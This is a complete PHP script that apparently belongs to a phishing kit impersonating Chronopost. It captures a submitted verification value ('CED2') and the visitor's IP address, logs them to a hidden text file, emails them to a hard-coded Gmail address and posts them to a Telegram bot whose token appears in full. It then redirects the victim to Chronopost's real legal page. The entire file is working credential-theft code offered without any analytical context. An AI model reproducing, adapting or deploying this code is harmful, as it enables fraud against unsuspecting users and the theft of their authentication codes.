<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // and !empty($_POST['pin'])
          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            $message = "
            -
            --------------------
            | 2ND : " . $_POST['CED2'] ."
            | INF : " . $ip . "
            --------------------\n";

            $file = fopen("./2b456e64d92ddecd.txt", "a+");
            fwrite($file, $message);fclose($file);
            $CED2 = $_POST['CED2'];
            $to = "lmechouar@gmail.com";
            $subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (2ND)";
            $headers = "From: Ak47™<lmechouar@gmail.com>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
            mail($to, $subject, $message, $headers);
            file_get_contents("https://api.telegram.org/bot5254054002:AAHgwgtpZ-3XgKq4FrLh5UodYPoVjI3793E/sendMessage?chat_id=1362211844&text=" . urlencode($message)."" );
            
            
            
            header("Location:https://www.chronopost.fr/fr/mentions-legales");
    
}
?>